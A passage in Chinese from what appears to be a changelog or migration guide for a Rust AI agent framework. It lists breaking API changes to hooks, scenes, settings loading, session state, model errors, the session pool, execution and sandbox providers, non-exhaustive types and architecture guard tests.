  `run_elicitation_result` 末尾多 `stop`;`check_rewakes(stop, ambient)`。`PromptHookExecutor::execute` /
  `AgentHookExecutor::execute` 末尾多 `stop: &CancellationToken`,实现方应在它取消时尽快返回;
  `AgentHookExecutor::execute` 的错误类型由 `String` 改为 `hooks::runner::AgentHookError { NotJudged,
  Failed(String) }`。`HookOutcome` 新增 `Cancelled`。
- **`HookRunner::run` 对不回答引擎的事件不理会 `stop`**,hook 跑到自己的超时;要掐掉它们的宿主改用
  hook 自己的 `timeout`。

#### 场景

- **`Scene` trait 改成数据 `SceneSpec`,唯一的行为是提示词钩子 `ScenePrompt`**(`system` 与
  `session_context`,固定文本用 `FixedPrompt`)。`SceneSpec` 是 `#[non_exhaustive]`:`SceneSpec::new(id,
  name, prompt)` 后改字段。宿主在内建场景上改出自己的场景时改字段即可,不再包一层 trait 逐个转发。
  `Builder::scene`、`Assembly.scenes`、`SessionPool::register_scene` 收 `Arc<SceneSpec>`。
- **工具面是 `ToolSurface { allow, deny, deferred }`**,`allow` / `deny` 是一层 `ToolSelector`:黑名单
  始终生效,`mcp__` pattern 按工具来源匹配(行为变化见"部署")。`ToolPattern` 实现 `Display`。
- **会话命名改由 `session_naming` 模板(`{first_message}`)给出**,`auto_name_session` /
  `session_name_prompt` 删除;`memory_extraction_prompt` 改为字段 `memory_extraction_intro`;
  `declarative::Reminder` 是 `base` 的 `Reminder` 的重导出;`Interaction` 实现 `Default`(`Interactive`)。

#### 设置

- **`Settings` 只描述文件里能写的值,加载结果在 `LoadedSettings`。** `Settings` 去掉 `paths`、
  `session_dir`、`permission_rules`、`local_permission_rules`、`project_layer`、`ignored_values`、
  `managed`、`mcp_server_dirs`;`LoadedSettings { values, paths, rules, managed, mcp_server_dirs, ignored }`
  提供 `load` / `load_from` / `load_without_project` / `new` / `with_managed` / `with_project_layer` 与
  `trust()`、`requires_trust()`、`bypass_disabled()` 等访问器,值一律经 `.values` 读(没有 `Deref`)。
  `Settings::load*`、`apply_managed`(改名 `with_managed`,按值)、`bypass_disabled` 移到
  `LoadedSettings`;`SettingsFile { settings, permission_rules }` 表示单份文件,schema 由它生成;
  `PermissionRule` 去掉 `tier`,层归属在 `LoadedRule { rule, tier, machine_local }`;
  `deprecated_settings_keys` 删除;`PathSettings` 实现 `Default`。
- **改收 `LoadedSettings` 的:** `EngineConfig::from_settings` → `from_loaded`;
  `permissions::rule::rules_from_all_tiers` → `rules_from`;`ManagedPolicy::from_settings` →
  `ManagedLayer`;`runtime::agent::Builder::settings`、`Agent::settings()`、`SessionContext.settings`、
  `base::prompt::assemble_prompt`、agents / skills 的目录函数、`DaemonConfig.settings`。
- **未信任项目层的归类表是 `base::project_trust::PROJECT_TIER`**,给 `Settings` 加字段而不归类,
  `every_settings_key_has_an_entry` 就过不了。

#### 会话状态与引擎

- **`SessionState` 不再有 `pub` 字段。** 由设置和场景推出来的 `cwd`、`additional_writable_dirs`、
  `read_directories`、`read_anywhere`、`cache_directories`、`unattended` 收进 `SessionEnv`,读
  `state.env().<字段>`;`session_id`、`started_at` 删除(会话 id 以 `SessionManager` 为准)。
  `SessionState::new` 不再收 `cwd`,建出来的状态没有挂引擎,测试用 `for_tests(cwd)` / `for_tests_in(env)`。
  `bind_tools`、`bind_exec` 删除,改用 `attach(EngineAttachment::new(env, exec, generation).with_tools(..))`;
  没挂引擎时 `exec()`、`tool()` 返回 `None`。
- **跨回合的东西归会话,一个回合的东西归回合。** `set_turn_origin` / `turn_origin` /
  `set_structured_output` / `take_structured_output` 删除,改用 `ToolContext.turn`(`TurnScope`);spend、
  输出 token 目标、已调用的 skill 挪进 `SessionState` 的 `SessionLedger`(`Agent.token_budget`、
  `PromptContext.invoked_skills` 删除);模型选择记在 `SessionState::model_choice` /
  `set_model_choice`,引擎每轮开头读。`snapshot_file`、`restore_snapshot`、`restore_to_turn`、
  `bump_turn`、`current_turn`、`carry_session_state_from`,连同类型 `FileSnapshot`、`FileSnapshotRegistry`、`GoalSlot::carry_arming_from`、
  `restore_goal`、`restore_durable_state` 删除,后两者改用 `restore_from_log(goal, durable)`;
  `DurableState` 新增 `activated_tools`。
- **任务与目标类型化。** `RunningTask::info() -> TaskInfo`、`SessionState::task_infos()`、
  `subscribe_tasks() -> Receiver<TaskEvent>`、`RunningTask::report_to(Sender<TaskEvent>)`、
  `goal_view() -> Option<GoalView>`、`goal_create` / `goal_update -> Result<GoalView, GoalError>`、
  `subscribe_goal() -> Receiver<Option<GoalView>>`、`GoalSlot::view()`,不再是 `serde_json::Value`。
- **宿主可以持有会话状态跨引擎。** `Builder::session_state(state, generation)` 让引擎在宿主给的状态上跑,
  `build` 不挂载,宿主在上一代引擎停下后调 `Agent::attach_session`;`Builder::steering(handle)` 让插话
  队列跨引擎(`SteerHandle` 实现 `Default`)。`Agent::resume_session` 拆成 `load_transcript(id)` 与
  `restore_state_from_log()`。`Builder::run_slots(..)` 给 `RunCode` 的空位(`runtime::agent::default_run_slots()`
  每次给一份新的;`ptc::default_run_slots()` 同样不再是进程级共享的一份)。
- **输入与命令。** `InputMessage::Steer` 去掉 `ack`,要知道是否被收下用 `SteerHandle::offer`;
  `InputMessage::Context` 的 `reply` 是 `oneshot::Sender<Result<ContextAnswer, ContextError>>`
  (`ContextAnswer { Inspected(ContextReport), Dropped, Edited }`,`ContextError { Refused, NotRecorded }`);
  新增 `InputMessage::Flush`;`EngineCommand::UpdateModel` 删除。
- **事件。** `AgentEvent::Error { failure: TurnFailure, turn_id, persisted }` 取代
  `{ code: "turn_error", message }`;`AgentEvent::TurnComplete` 多 `persisted`(serde 缺省 `true`);
  新增 `AgentEvent::ModelRetry` 与 `AgentEvent::PromptResolved { prompt_id, resolution, reason }`
  (`base::event::PromptResolution`、`WithdrawalReason { TimedOut, Cancelled }`);`runtime::elicitation::OpenPrompt` 是登记待答提问的句柄。
- **`compaction::aging::Aging` 多一个 `undo: AgingUndo` 字段**(它实现 `Default`),用结构体字面量构造
  `Aging` 的要补上。引擎撤回压缩改用整步检查点,不再读它。
- **`base::frozen::skill::expand_skill_vars_named` 多一个 `vars: Option<&InvocationVars>`**,
  `${AGIX_SKILL_DIR}`、`${AGIX_SESSION_ID}` 从它取,`None` 时原样保留。

#### 模型与恢复

- **`ModelError` 从枚举改成 `{ kind: ModelErrorKind, status, retry_after, message }`。** 变体 `Api`、
  `Auth`、`RateLimited`、`Overloaded`、`Network`、`Cancelled`、`Internal`、`Unsupported`、`NotRecorded`
  删除:匹配改读 `e.kind`;构造用 `ModelError::new(kind, msg)` 加 `with_status` / `with_retry_after`,或
  `cancelled()`、`overloaded()`、`rate_limited()`、`auth()`、`transport()`、`timeout()`、
  `stream_interrupted()`、`protocol()`、`invalid_request()`、`unsupported()`、`not_recorded()`(原来的
  `Internal` 一般对应 `protocol()`)。文本改为 `<kind>[ (HTTP <status>)][: <message>]`。分类只在 model
  crate 里做(`model::error::classify`),守卫不许别处构造 `ModelErrorKind`。
- **恢复策略。** `ModelFailure` 从枚举改成 `{ kind, message, retry_after, after_first_byte }`;
  `RecoveryPolicy::on_failure(&self, failure: &ModelFailure<'_>, so_far: &CallRecovery) -> Recovery`;
  `Recovery` 多 `RetrySame { after }`;`RequestFailure`、`ModelError`、`ModelErrorKind`、`ModelFailure` 是
  `#[non_exhaustive]`。自己实现 `RecoveryPolicy` 的改读 `failure.kind` 并处理 `so_far`。
- **`compaction::CompactError` 新增 `Model(ModelError)`**:摘要模型的调用、流、超时失败原样带出。
- **一轮怎么失败。** `TurnError::Model(ModelError, bool)`(第二项为这一轮是否已跑过工具);
  `base::event::{TurnFailure, FailureKind}` 是引擎、池、线上共用的描述。

#### 会话池

- **池的错误是 `PoolError`。** `session_pool::{RpcError, ResumeError, SetModelError}` 删除;池方法一律返回
  `Result<_, PoolError>`,错误码、message 与 `data` 由 `server/errors.rs` 一处决定。忙是
  `PoolError::SessionBusy(Busy)`(`BusyReason` 是 `#[non_exhaustive]`,多了 `ContextOperation`);引擎失败是
  `PoolError::Engine(TurnFailure)`,`EngineStopped`、`EngineUnreachable` 并入它。
- **池方法返回领域类型,不再是 `serde_json::Value`。** 生命周期(`create_session` → `SessionCreated`、
  `session_detail` → `SessionDetail`、`resume_session` → `ResumeReport`、`delete_session`、`fork_session`、
  `rename` / `setModel` / `setPrompt` 各自的结果)、上下文(`context_request` 改为私有,换成
  `inspect_context` / `drop_messages` / `edit_message`)、任务(`session_tasks` 返回 `Result`,`task_output`
  返回 `Result<Value, PoolError>`,`message_task` 返回 `Result<MessageDelivery, PoolError>`,`start_agent` →
  `AgentStarted`)、历史与目标(`session_history` → `HistoryPage`、`append_entry`、`list_entries`、
  `export_session`、`session_goal` / `change_session_goal` → `Option<GoalView>`)、配置与项目(`ConfigTier`、
  `ProviderConfigView`、`ProjectStatus` …)、场景(`SceneSummary`、`SceneDescription`、`SceneReload`)、MCP
  (`McpServerStatus` 等,登录入口收 `McpRedirect`、`McpIdentity`)、插件(`list_plugins`、`reload_plugins`
  返回 `Result`,scope 是 `PluginScope`)、`doctor_report` → `DoctorReport`(多 `runtime`)、
  `list_commands` → `CommandInfo`、`schedule_add(NewSchedule)`、`discovery::identity` → `DaemonIdentity`。
  类型都在 `session_pool::api`。新增 `subscribe_resuming`(不在内存就恢复再订阅)。
- **事件出口是 `SessionWatcher`,池不再持有 `rpc::Client`。** `subscribe_session` 收
  `Arc<dyn SessionWatcher>`、返回 `Subscribed`(待答提问是 `PendingAsk`);`unsubscribe_session` 收
  `WatcherId`;`PromptAnswer::prompt_type()` 改为 `kind() -> AskKind`。`SessionEvent::Task(TaskEvent)`、
  `GoalChanged(Option<GoalView>)` 带类型。没调 `start_scheduler` 的池也转发轮间、任务与目标事件。
- **池级通知是 `DaemonEvent`。** `SessionPool::emit_event(DaemonEvent)`、`subscribe_events() ->
  broadcast::Receiver<DaemonEvent>`;新增 `EvictReason`(多 `EngineFault`)、`CloseReason`、`ImportSource`。
- **`run_turn(TurnRequest, Option<Arc<dyn SessionWatcher>>) -> Result<TurnOutcome, PoolError>`。**
  `TurnRequest` 的发起方是 `Initiator { Client, Schedule, Goal }`;`TurnOutcome` 是 `#[non_exhaustive]`。
  回合由池 spawn 的驱动跑,调用方的 future 被丢下也不影响这一轮。
- **池的构造。** `SessionPool::builder` 是 `pub(crate)`,池只经 `assembly::assemble::pool` 与 `Assembly`
  得到;池上的 `with_*` 方法删除(crate 外本来就调不到)。新增 `session_pool::MCP_COMPILED`;没编进 MCP
  的构建里 `mcp_status`、`add_mcp_server` 等方法也存在(返回空或内部错误)。`SessionPool::run_slots()`
  读出池的 `RunCode` 空位。`start_janitor` / `start_config_watcher` 只持池的弱引用、返回 `JoinHandle`,
  最后一个外部持有者放手后池被释放,两个循环随之退出。
- **`SessionPool::check_scene` 与 `session_pool::SceneCheck` 删除。** 场景不符由 `resume_session` /
  `fork_session` 报 `PoolError::SceneMismatch`。
- **`Assembly::permission_prompt_timeout` 改为 `Option<Duration>`**,`None` 由会话设置决定。
- **默认项目只有一个根:`Assembly.cwd`。** 不传 `project_root` 的会话(和显式传这个目录的)以前在
  `Assembly.cwd` 里干活,项目层设置、`settings.local.json`、`config.setProvider` / `config.reload`
  不带项目时读写的文件、`daemon.doctor` 的项目层却按 `DaemonPaths::project_root` 定。两者不同时现在一律
  按 `Assembly.cwd`;宿主在内存里改过的值和加的权限规则照样叠上去。两者相同(`agixd` 就是)不受影响。
- **回合状态与会话组成。** `api::TurnState` 多 `Rebuilding`、`Operating`;池内部按 `SessionCore`
  (跨重建不变)、`EngineSlot`(当前这一代引擎)、`TurnSlot` 组织,设计见 `ARCHITECTURE.md` §3.2。

#### `Builder` 的注入口与执行层

- **`Builder::exec(ExecProviders)`:换掉会话的四个执行契约。** 只设 `exec` 就用它,都没设走本机缺省;
  **`exec` 与 `process_groups` 同时设置时 `build()` 返回错误**,要记进程组就在传入的 providers 里带上
  台账(`platform::local_providers_with_ledger`)。工具调用、引擎的 `git` 与 `pdftotext`、
  `Agent::warmup` 的预连接都落在传入的 providers 上;子 Agent 沿用。
- **`Builder::token_counter(..)`。** 请求开销估算、`inspectContext` 的计数、`compact_now` 的目标大小都用
  会话的计数器;`SessionManager` 的 `token_counter` 是非 `Option` 的 `Arc<dyn TokenCounter>`(缺省
  `model::tokens::default_counter()`)。
- **`Builder::rule_provider(..)` 与 `RuleTiers`。** `RuleTiers::for_paths(&PathSettings)` 给出全局、场景、
  项目三层,`render_rules_prompt(&[RuleEntry])` 只负责渲染;`AssemblyRequest` 新增 `rules` 字段(字面量
  构造的要补上),`base::prompt::assemble_prompt_with` 收 `&AssemblyRequest`。
- **引擎的 `git` 与辅助程序统一经 `base::engine_exec::EngineExec`**(`EngineExec::git` /
  `EngineExec::helper`),它持有会话的 `ExecProviders`、`Confinement`(`Unconfined` /
  `Sandboxed { policy, require_enforcement, tmpdir }`)与 `ProjectTrust`,`admit_git` 决定能不能跑。
  `FrozenContext::{collect, collect_without_project, collect_with_options, refresh_git, refresh_git_status}`、
  `tools::worktree::{create_worktree, prune_orphan_worktrees}`、`read_pdf_text` 改收 `&EngineExec`;原来传
  `EngineGit::Direct` 的改为 `Confinement::Unconfined`。**`ExecProviders::in_process()` 的会话不再有 `git`
  上下文**,除非给 `ScriptedProcess` 写 `git` 的应答。
- **`script-host` 的 QuickJS 是可选特性 `quickjs`(缺省开)。** 自带 `ScriptEngine` 的宿主可以关掉它。
- **`memory.storage` 不再列为扩展契约**(`Builder::memory_store` 收具体类型,实际换不掉);扩展点表
  多一列"接线",写明每个契约经哪些路径接进引擎。

#### 加了 `#[non_exhaustive]` 的枚举

在 crate 外穷尽 `match` 下面这些的,要补 `_` 分支:

- 错误:`ToolError`、`EffectError`、`HttpError`、`ValidationError`、`ExecError`、`EngineExecError`、
  `ScriptError`、`GoalError`、`MemoryError`、`ImportError`、`IdError`、`SettingsFileError`、`DelegateError`;
- 引擎交给宿主读的:`ElicitKind`、`HealthStatus`、`CallKind`、`TaskStatus`、`TaskType`、`TurnOrigin`、
  `BlockOrigin`、`Reminder`、catalog 的 `Kind` / `Frequency` / `Access` / `Wiring`;
- 来源与状态:`AgentTypeSource`、`OutputStyleSource`、`ImportSource`、`ImportSourceKind`、`GoalPhase`、
  `GoalAction`、`MemoryType`、`MemoryScope`;
- `session_pool::api` 里引擎产出的:`CommandKind`、`CommandSource`、`EvictReason`、`CloseReason`、
  `HistoryOrigin`、`SessionKindName`、`McpServerState`、`McpAuthState`、`SkillOrigin`、`TurnState`、
  `ScriptCallOutcome`、`ResumeStatus`、`Applies`、`TrustState`;
- 以及上文提到的 `ModelError` 一族、`BusyReason`、`TurnOutcome`、`SceneSpec`、`ToolSpec` 一族、权限事实
  类型(`PermissionFacts`、`Subject`、`Reach`、`Runs`、`ModeStance`、`ToolFacts`、`HookAnswer`、
  `Attendance`)。

不加的(安全裁决、宿主的回答与输入、设置值、会话协议、线上码,以及 `AgentEvent`、`DelegateMode`)由
守卫 A5 逐个写明为什么封闭。`plugin::PluginError` 新增 `EngineVersion`(没有 `#[non_exhaustive]`,
crate 外穷尽 `match` 要补分支),`PluginMeta` 新增公开字段 `requires_engine`。

#### 加了 `#[non_exhaustive]` 的结构体

在定义它的 crate 之外不能再用结构体字面量或 `..Default::default()` 构造,解构要写 `..`:

- `base::tool`:`ToolResult`、`ToolContext`、`PromptContext`、`ProgressUpdate`;
- `base::interface::model::ToolDef`;
- `base::interface::scene`:`ToolSurface`、`ModuleSurface`、`TokenBudget`、`ExecutionParams`、
  `ScenePromptContext`、`ReminderContext`;
- `base::interface::delegate::StartedAgent`;
- `base::settings`:`Settings`、`ModelSettings`、`PathSettings`、`ExecutionSettings`、`SandboxConfig`、
  `CompactionConfig`、`PluginsConfig`;
- `plugin::manifest`:`PluginMeta`、`ScriptPayload`、`McpPayload`、`SceneSection`、`SkillsSection`、`AgentDef`
  (从 TOML 读出,嵌入方一般不构造)。

怎么构造:

- `ToolResult::text(s)` / `error_text(s)` / `blocks(v)`,再 `.with_error(..)`、`.with_structured(..)`、
  `.with_mcp_meta(..)`、`.with_new_messages(..)`;
- `ToolContext::new(cwd, cancel, exec, config, session)`,其余字段取缺省,需要时在值上改;
- `ProgressUpdate::text(msg).with_progress(..).with_total(..)`;
- `ToolDef::new(name, description, schema).with_source(..)`;
- `ReminderContext::new(cwd)` 加 `.git_status(..)`、`.memory_summary(..)`;`TokenBudget::new(threshold,
  keep_recent)`、`ExecutionParams::new(max_api_calls)`、`ModuleSurface::new(allow, deny)`、
  `StartedAgent::new(..)`;`ToolSurface` 用 `from_lists` / `allowing` / `denying` / `deferring`;
- `PromptContext`、`ScenePromptContext`、`PathSettings`、`ExecutionSettings`、`CompactionConfig`:
  `X::default()` 后改字段;`Settings::defaults_for(model)` 后改字段,`ModelSettings`、`SandboxConfig`、
  `PluginsConfig` 经 `Settings` 改(如 `values.model.max_tokens = ..`)。

`let mut x = X::default(); x.f = ..;` 会触发 clippy 的 `field_reassign_with_default`,工作区各 crate
已放行;自己的 crate 开着 `-D warnings` 的,同样放行或改用构造函数。

#### 测试与守卫

- **测试支撑。** 用真 `git`、真进程的测试挪到 `platform` 的 integration 测试;`base` 里用
  `ExecProviders::in_process()` 与 `ScriptedProcess`。`base` 自带 `clippy.toml`,禁止起进程与读环境变量;
  工作区的 `tokio` 去掉了 `process`、`signal`、`net`,用到的 crate 自己声明。
- **架构守卫在 `tests/guards`。** 依赖方向(`deps.rs`,读 `cargo metadata`)、进程级状态
  (`process_state.rs`)、源码规则(`sources.rs`)、接线(`wiring.rs`)、未用依赖(`unused_deps.rs`)、
  尺寸棘轮(`size.rs`)、权限(`permissions.rs`)、委派(`delegation.rs`)、接口表面(`api_surface.rs`)、
  分层(`layering.rs`)、会话状态(`session_state.rs`)、`base` 的依赖白名单(`base.rs`)。说明见
  `tests/README.md` 的"架构守卫"。向工作区加 crate 的,要在 `deps.rs` 的 `CRATES` 里给它一个级别;工作区
  成员数为 28。
- **golden。** 冻结的 golden:`crates/tools/tests/spec_snapshot.rs`(工具声明与权限事实)、
  `crates/runtime/src/agent/turn/tests/tool_defs_golden.rs`(请求的 tools 数组字节)、
  `crates/scene/tests/prompt_golden.rs`(场景系统提示字节)、权限的决策矩阵、
  `crates/assembly/testdata/session_events.golden.json`(会话帧的线上 JSON)。确实要改时分别用
  `UPDATE_GOLDEN=1` 与 `AGIX_UPDATE_GOLDEN=1` 重新生成。
